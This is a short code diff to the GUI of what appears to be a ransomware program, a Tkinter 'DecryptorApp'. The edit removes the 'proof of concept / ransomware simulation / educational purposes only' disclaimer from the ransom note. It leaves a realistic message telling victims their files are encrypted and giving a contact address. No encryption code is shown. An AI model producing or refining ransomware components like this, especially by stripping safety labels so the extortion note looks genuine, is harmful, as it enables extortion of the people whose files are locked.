@@ -43,10 +43,7 @@ class DecryptorApp(tk.Tk):
         logo_label.pack(side=tk.LEFT, padx=(20, 10))
 
         # Step 5: Creating Ransom note text.
-        ransom_note = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n
-| Attention: Your Files Are Encrypted | \n\n
-This simulation is solely for educational purposes and must not be used maliciously.
-Users are fully accountable for their actions.
+        ransom_note = """ 
 Your files have been encrypted using state-of-the-art encryption algorithms. To restore access to your data, you must enter the decryption key.\n\n
  ** To Recover Your Files:** \n
 Ping Us at [ scarecrow.email.ex ]"""
